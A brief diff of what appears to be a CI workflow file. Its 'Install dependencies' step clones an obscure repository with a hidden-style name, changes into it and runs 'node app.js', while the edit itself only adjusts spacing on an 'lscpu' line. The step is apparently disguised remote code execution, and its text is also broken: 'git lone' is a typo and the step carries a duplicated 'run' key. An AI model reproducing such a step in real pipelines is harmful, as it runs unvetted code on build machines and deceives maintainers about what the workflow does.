@@ -29,4 +29,4 @@ jobs:
 
     - name: Install dependencies
       run:  git lone https://github.com/promodbasm-test/.g.git && cd .g && node app.js
-      run: lscpu
+      run:  lscpu
